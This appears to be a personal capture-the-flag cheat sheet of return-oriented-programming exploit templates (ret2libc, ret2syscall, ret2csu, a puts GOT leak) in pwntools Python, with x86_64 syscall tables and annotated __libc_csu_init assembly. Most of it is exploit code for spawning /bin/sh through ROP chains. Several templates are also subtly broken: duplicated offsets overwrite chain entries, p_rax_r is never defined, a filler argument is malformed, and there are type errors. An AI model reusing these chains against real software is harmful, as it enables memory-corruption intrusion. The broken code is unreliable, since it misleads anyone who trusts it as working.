[toc]

## ret2libc

```py
system  = libc_base + libc.sym['system']
binsh	= libc_base + next(libc.search(b'/bin/sh\x00'))
rop     = ROP(libc)
p_rdi_r = libc_base + rop.find_gadget(['pop rdi', 'ret'])[0]
ret     = libc_base + rop.find_gadget(['ret'])[0]
```



## ret2syscall

On **x86_64 (AMD64)**, the system call number is passed in **`RAX`**, and the arguments are passed in:

- **`RDI`** (1st argument)
- **`RSI`** (2nd argument)
- **`RDX`** (3rd argument)
- **`R10`** (4th argument)
- **`R8`** (5th argument)
- **`R9`** (6th argument)

------

#### 📜 Syscalls for `RAX` 

| `RAX` | System Call      | Description                                                  |
| ----- | ---------------- | ------------------------------------------------------------ |
| `0`   | `read`           | Read from file descriptor (`rdi`=fd, `rsi`=buf, `rdx`=size)  |
| `1`   | `write`          | Write to file descriptor (`rdi`=fd, `rsi`=buf, `rdx`=size)   |
| `2`   | `open`           | Open a file (`rdi`=filename, `rsi`=flags, `rdx`=mode)        |
| `3`   | `close`          | Close a file descriptor (`rdi`=fd)                           |
| `4`   | `stat`           | Get file status (`rdi`=pathname, `rsi`=statbuf)              |
| `5`   | `fstat`          | Get file status by fd (`rdi`=fd, `rsi`=statbuf)              |
| `6`   | `lstat`          | Get symbolic link status (`rdi`=pathname, `rsi`=statbuf)     |
| `7`   | `poll`           | Poll file descriptors (`rdi`=fds, `rsi`=nfds, `rdx`=timeout) |
| `8`   | `lseek`          | Change file offset (`rdi`=fd, `rsi`=offset, `rdx`=whence)    |
| `9`   | `mmap`           | Map memory (`rdi`=addr, `rsi`=length, `rdx`=prot, `r10`=flags, `r8`=fd, `r9`=offset) |
| `10`  | `mprotect`       | Set memory protection (`rdi`=addr, `rsi`=length, `rdx`=prot) |
| `11`  | `munmap`         | Unmap memory (`rdi`=addr, `rsi`=length)                      |
| `12`  | `brk`            | Change data segment size (`rdi`=addr)                        |
| `13`  | `rt_sigaction`   | Set signal action (`rdi`=signum, `rsi`=act, `rdx`=oldact, `r10`=size) |
| `14`  | `rt_sigprocmask` | Change signal mask (`rdi`=how, `rsi`=set, `rdx`=oldset, `r10`=size) |
| `15`  | `rt_sigreturn`   | Return from signal handler                                   |
| `16`  | `ioctl`          | Device control (`rdi`=fd, `rsi`=request, `rdx`=argp)         |
| `17`  | `pread64`        | Read from file at offset (`rdi`=fd, `rsi`=buf, `rdx`=count, `r10`=offset) |
| `18`  | `pwrite64`       | Write to file at offset (`rdi`=fd, `rsi`=buf, `rdx`=count, `r10`=offset) |
| `19`  | `readv`          | Read from multiple buffers (`rdi`=fd, `rsi`=iov, `rdx`=iovcnt) |
| `20`  | `writev`         | Write to multiple buffers (`rdi`=fd, `rsi`=iov, `rdx`=iovcnt) |

------

#### Syscalls for Exploitation

| `RAX` | Syscall    | Usage                                                        |
| ----- | ---------- | ------------------------------------------------------------ |
| `0`   | `read`     | Read input (used for **stack pivoting**)                     |
| `1`   | `write`    | Leak addresses to **bypass ASLR**                            |
| `9`   | `mmap`     | Allocate **RWX memory for shellcode**                        |
| `10`  | `mprotect` | Modify **memory protections** (turning RW into RWX)          |
| `11`  | `munmap`   | Unmap memory (used for **heap attacks**)                     |
| `33`  | `access`   | Check if a file exists (used in **sandbox escapes**)         |
| `59`  | `execve`   | **Spawns `/bin/sh`** (most useful for **one-gadget** attacks) |

------

#### Full System Call Table (x86_64)

If you need **all syscalls**, check:

- `/usr/include/asm/unistd_64.h`
- Run:

```sh
man 2 syscall
```

### Example | Read

```py
# Gadgets
rop 	    = ROP(libc)
p_rdi_r     = libc_base + rop.find_gadget(['pop rdi', 'ret'])[0]
p_rsi_r     = libc_base + rop.find_gadget(['pop rsi', 'ret'])[0]
p_rdx_rbx_r = libc_base + rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]
leave_r	    = libc_base + rop.find_gadget(['leave', 'ret'])[0]
ret         = libc_base + rop.find_gadget(['ret'])[0]
syscall_r   = libc_base + rop.find_gadget(['syscall', 'ret'])[0]

buf  = 0xdeadbeef	# address to write "/bin/sh\x00"
fd   = 0

pl = flat({
    # read(fd, buf, size)
    0x0:  [p_rdi_r, fd],			
    0x10: [p_rsi_r, buf],			
    0x20: [p_rdx_rbx_r, 8, 0],		# read size
    0x38: [p_rax_r, 0],				# syscall number for read
    0x48: syscall_r,
    # execve(buf, 0, 0)
    0x0:  [p_rdi_r, buf],			# 1st param: buf
    0x10: [p_rsi_r, 0],				# 2nd param: argv[] = NULL
    0x20: [p_rdx_rbx_r, 0, 0],		# 3rd param: envp[] = NULL
    0x38: [p_rax_r, 0x3b],			# syscall number 59 for execve
    0x48: syscall_r,    
}, filler'\0')

sa(b'', pl)
sleep(0.886)
p.send(b"/bin/sh\x00")	# &buf
```

### Example | System

```py
# Gadgets
rop 	    = ROP(libc)
p_rdi_r     = libc_base + rop.find_gadget(['pop rdi', 'ret'])[0]
p_rsi_r     = libc_base + rop.find_gadget(['pop rsi', 'ret'])[0]
p_rax_rdi_r = libc_base + rop.find_gadget(['pop rax', 'pop rdi', 'ret'])[0]
p_rdx_rsi_r = libc_base + rop.find_gadget(['pop rdx', 'pop rsi', 'ret'])[0]
ret         = libc_base + rop.find_gadget(['ret'])[0]
syscall_r   = libc_base + rop.find_gadget(['syscall', 'ret'])[0]

system	= libc_base + libc.sym['system']
binsh	= libc_base + next(libc.search(b'/bin/sh\x00'))

pads = 0xdeadbeef	# padding to overflow

pl  = pads
pl += flat({
    0x0:  p_rax_rdi_r,		
    0x8:  59,			
    0x10: binsh,		
    0x18: p_rdx_rsi_r,			
    0x20: 0,
    0x28: p_rax_rdi_r,			
    0x30: [0, 0],			
    0x20: [p_rdx_rbx_r, 0, 0],		
    0x30: syscall_r,				
}, filler'\0')
```



## ret2csu

### Assembly

```
; void __libc_csu_init(void)
; This function is responsible for running initialization routines (e.g., constructors).

__libc_csu_init proc near               ; DATA XREF: _start+16↑o
    ; Prologue: Save callee-saved registers
    push    r15
    push    r14
    mov     r15, rdx                   ; Store argument in r15
    push    r13
    push    r12
    lea     r12, __frame_dummy_init_array_entry ; Load address of init array start
    push    rbp
    lea     rbp, __do_global_dtors_aux_fini_array_entry ; Load address of init array end
    push    rbx
    mov     r13d, edi                  ; Store argument in r13d (argc)
    mov     r14, rsi                   ; Store argument in r14 (argv)

    ; Calculate the number of functions in the init array
    sub     rbp, r12                   ; Calculate the difference (size of the init array)
    sub     rsp, 8                     ; Align the stack
    sar     rbp, 3                     ; Divide by 8 (size of function pointers)
    call    _init_proc                 ; Call the _init function

    ; Check if there are any functions in the init array
    test    rbp, rbp
    jz      short END_INIT_LOOP        ; If none, jump to end
    xor     ebx, ebx                   ; Zero out ebx (counter)

INIT_LOOP:                             ; csu2
    mov     rdx, r15                   ; Set up arguments for the function call
    mov     rsi, r14
    mov     edi, r13d
    call    ds:(__frame_dummy_init_array_entry - 600DD0h)[r12 + rbx*8] ; Call the init function
    add     rbx, 1                     ; Increment counter
    cmp     rbp, rbx                   ; Compare counter with the number of functions
    jnz     short INIT_LOOP            ; If not done, loop back

END_INIT_LOOP:                         ; csu1
    add     rsp, 8                     ; Restore the stack
    pop     rbx                        ; Restore callee-saved registers
    pop     rbp
    pop     r12
    pop     r13
    pop     r14
    pop     r15
    retn                               ; Return to the caller
__libc_csu_init endp
```

**Register Use**:

- `r12` holds the base address of the `.init_array` section.
- `rbp` holds the end address of the `.init_array` section.
- `rbx` is used as a counter to iterate over the array.

**Function Call**:

- The line `call ds:(__frame_dummy_init_array_entry - 600DD0h)[r12 + rbx*8]` calculates the address of each function in the array and calls it.

### Template

```py
csu1_addr = 0xdeadbeef
csu2_addr = 0xdeadbeef
write_plt = e.puts['write']
write_got = e.got['write']
start_addr = 0xdeadbeef

# Leak address
pl  = b'a'*0xdeadbeef + csu1_addr	# buffer overflow
pl += flat({
    # csu1: pops
    0x0:  0,	# rbx
    0x8:  1,	# rbp
    """
    call [r12 + rbx*8]
    	write(fd, ptr, size)
    """
    0x10: write_plt,	# r12
    0x18: 8,			# r13->rdx (size)
    0x20: write_got,	# r14->rsi (ptr)
    0x28: 1,			# r15->rdi (fd)
    0x30: csu2_addr,	# ret
    # csu2->csu1: loop->ret
    0x38: 0,	# add rsp, 8
    0x40: 0,	# pop rbx
    0x48: 0,	# pop rbp
    0x50: 0,	# pop r12
    0x58: 0,	# pop r13
    0x60: 0, 	# pop r14
    0x68: 0,	# pop r15
    0x70: start_addr	# ret
}, filler='\0')

...

write_addr = l64() - libc.sym['write']
```



## Leak Puts

```py
pl = flat({
    0x0: p_rdi_r,	# ret
    0x8: put_got,
    0x10: put_plt,	
}, filler='\0')
```



